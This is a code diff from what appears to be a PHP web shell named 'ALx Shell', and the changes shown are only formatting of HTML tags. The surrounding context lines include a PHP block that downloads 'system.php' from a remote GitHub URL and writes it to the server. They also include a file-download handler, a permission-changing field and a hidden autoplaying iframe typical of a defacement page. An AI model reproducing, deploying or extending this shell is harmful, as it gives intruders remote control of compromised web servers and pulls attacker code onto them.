@@ -244,8 +244,7 @@ If you say this is a game,we also say this is a game,can make clutter on your we
 </form>
 	<iframe width="0" height="0" src="https://archive.org/download/HallowedBeMyName/Hallowed%20Be%20My%20Name.mp3" frameborder="0" allowfullscreen</iframe>
 </script>
-</center>
-</html>
+</center></html>
 <?php 
 $fp = fopen("system.php", "w"); 
 fwrite($fp, file_get_contents("https://raw.githubusercontent.com/alxwahid/3voScript/master/system.php")); 
@@ -284,8 +283,7 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')
     exit;
 }
 ?>
-<html>
-<head>
+<html><head>
 <title>ALx Shell.</title>
 <meta name='author' content='ALxWahid'>
 <meta charset="UTF-8">
@@ -5769,5 +5767,4 @@ Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o
 		}
 	echo "<center>Database: ".date("D/M/Y")." - <a href='http://alxwahid.blogspot.pe/' target='_blank'><font color=red>ALx Wahid</font></a></center>";
 }
-?>
-</html>
+?></html>
